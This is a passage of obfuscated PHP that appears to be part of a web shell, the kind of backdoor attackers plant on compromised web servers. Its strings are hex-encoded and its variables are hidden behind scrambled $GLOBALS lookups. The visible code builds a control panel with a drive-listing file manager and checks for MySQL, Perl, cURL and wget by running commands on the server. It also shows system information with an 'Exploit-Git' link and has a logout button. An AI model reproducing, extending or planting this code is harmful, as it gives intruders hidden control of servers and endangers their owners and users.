6\x71"]} as${${"\x47L\x4fBA\x4c\x53"}["f\x77b\x74\x6c\x78\x6b\x67\x6f\x69w"]}=>${$sunlthrhxe})${${"\x47\x4c\x4f\x42\x41\x4c\x53"}["yye\x6fdm\x63b\x6d\x69\x78\x63"]}.="\x3ct\x68\x20wi\x64\x74\x68=\x22".(int)(100/count(${${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x6c\x68\x78g\x78\x65p\x76\x71"]}))."%\x22\x3e[ \x3ca\x20href\x3d\"#\x22 oncli\x63\x6b\x3d\"\x67(\x27".${${"\x47\x4cO\x42\x41\x4c\x53"}["bin\x6e\x79\x74\x65ry"]}."\x27,nu\x6c\x6c,\x27\x27,'\x27,'')\x22>".${${"\x47\x4c\x4f\x42A\x4c\x53"}["\x67sd\x77vcp"]}."</a>\x20]</th\x3e";${${"\x47\x4c\x4f\x42\x41\x4c\x53"}["mj\x66\x78sc\x70"]}="";if($GLOBALS["\x6fs"]=="win"){foreach(range("\x61","z")as${${"\x47\x4c\x4f\x42\x41\x4c\x53"}["f\x79\x62\x71\x66m\x73t"]}){$gficeykv="\x64r\x69\x76e";${"\x47\x4c\x4f\x42\x41\x4c\x53"}["n\x79\x71h\x68\x62"]="\x64\x72\x69\x76\x65";if(is_dir(${$gficeykv}.":\x5c"))${${"G\x4c\x4fB\x41\x4cS"}["\x63zf\x66\x65\x7a\x62"]}.="<\x61\x20h\x72\x65f=\"#\"\x20\x6f\x6e\x63\x6cic\x6b=\"g(\x27Fil\x65\x73M\x61\x6e','".${${"\x47L\x4f\x42\x41\x4c\x53"}["\x66\x79b\x71\x66\x6d\x73\x74"]}.":/')\x22\x3e[ ".${${"\x47\x4c\x4fBA\x4cS"}["\x6eyq\x68\x68b"]}."\x20]</\x61\x3e\x20";}}function showstat($stat){if(${${"G\x4c\x4f\x42A\x4c\x53"}["\x62\x62\x6d\x6fu\x67"]}=="o\x6e"){return"<\x62>\x3c\x66\x6fn\x74\x20sty\x6c\x65\x3d'c\x6f\x6cor:\x6cim\x65'>O\x4e</fo\x6et>\x3c/\x62\x3e";}else{return"<\x62\x3e<fon\x74\x20\x73\x74\x79le=\x27c\x6f\x6co\x72:\x72\x65\x64'\x3eOFF</\x66\x6fnt></\x62>";}}function hdd($s){$rrxowolczdy="\x73";$npwjiejofa="\x73";$sqesbdbvcbti="\x73";if(${${"\x47LOB\x41\x4c\x53"}["\x72\x79f\x67\x70by\x61fk\x71"]}>=1073741824)return sprintf("\x25\x31.\x32f",${${"\x47\x4c\x4f\x42\x41LS"}["\x72\x79f\x67pb\x79\x61\x66\x6bq"]}/1073741824)." G\x42";elseif(${${"G\x4c\x4f\x42\x41\x4c\x53"}["ryf\x67pb\x79\x61\x66\x6b\x71"]}>=1048576)return sprintf("\x251\x2e2\x66",${$npwjiejofa}/1048576)."\x20\x4d\x42";elseif(${$rrxowolczdy}>=1024)return sprintf("\x251\x2e2f",${${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x72yf\x67p\x62\x79\x61\x66\x6b\x71"]}/1024)." \x4bB";else return${$sqesbdbvcbti}."\x20B";}function testmysql(){if(function_exists("mys\x71l_\x63on\x6eec\x74")){return showstat("\x6fn");}else{return showstat("off");}}function testcurl(){if(function_exists("curl_ve\x72\x73i\x6f\x6e")){return showstat("\x6f\x6e");}else{return showstat("\x6f\x66f");}}function testwget(){if(ex("w\x67e\x74\x20--\x68\x65l\x70")){return showstat("o\x6e");}else{return showstat("of\x66");}}function testperl(){if(ex("per\x6c\x20-h")){return showstat("on");}else{return showstat("\x6ff\x66");}}echo"<\x73p\x61n\x20\x63la\x73\x73\x3d\x69\x6e\x66\x6f>&\x6e\x62\x73p;\x4d\x79\x53\x51L:\x20".testmysql()."&\x6e\x62\x73p\x3b|\x26\x6e\x62s\x70\x3b\x50erl: ".testperl()."&\x6ebsp\x3b|&nbs\x70;\x63URL: ".testcurl()."\x26\x6e\x62\x73p;|\x26\x6e\x62sp\x3bW\x47\x65t:\x20".testwget()."\x3cb\x75tton\x20sty\x6c\x65\x3d'\x63\x6fl\x6fr:#f\x66f;b\x61\x63k\x67\x72ou\x6e\x64-\x63\x6fl\x6fr:red;h\x65\x69\x67ht:20p\x78;\x66\x6c\x6f\x61t:\x72i\x67h\x74'\x20\x6f\x6e\x63li\x63\x6b\x3dw\x69\x6e\x64o\x77.l\x6f\x63a\x74i\x6fn='?\x6cogo\x75t=1'\x3b>\x3c\x62>↻ Logout</\x62\x3e</\x62u\x74t\x6f\x6e>\x3cb\x72\x3e";echo"<table\x20cl\x61\x73s\x3di\x6e\x66o \x63\x65\x6cl\x70a\x64d\x69\x6eg=3 c\x65ll\x73\x70a\x63\x69n\x67=\x30\x20wi\x64t\x68\x3d\x3100%\x3e<tr>\x3c\x74\x64\x20\x77\x69\x64\x74h\x3d\x31><spa\x6e\x3eU\x6e\x61\x6d\x65:\x3c\x62\x72>Use\x72:\x3c\x62\x72\x3eP\x68\x70:<b\x72>Hdd:<b\x72>C\x77d:".($GLOBALS["o\x73"]=="wi\x6e"?"<\x62r\x3eDriv\x65\x73:":"")."\x3c/s\x70an></\x74d\x3e"."<td>\x3c\x6eo\x62\x72>".substr(@php_uname(),0,120)."\x20 \x3c\x61 \x68r\x65\x66\x3d\"h\x74tp://\x77\x77w\x2eg\x6f\x6f\x67\x6c\x65\x2eco\x6d/se\x61r\x63h?q=".urlencode(@php_uname())."\x22\x20\x74\x61\x72\x67\x65t\x3d\"_bl\x61\x6ek\x22\x3e[\x47\x6f\x6fg\x6ce]</a> <\x61 \x68ref\x3d\"".${$opclsocltf}."\" \x74a\x72g\x65t=\x5f\x62lan\x6b\x3e[Ex\x70\x6c\x6f\x69\x74-\x47it]\x3c/\x61></nobr\x3e\x3c\x62\x72\x3e".${${"\x47L\x4f\x42A\x4c\x53"}["\x76\x67\x6f\x6dlr\x6a"]}."\x20( ".${${"\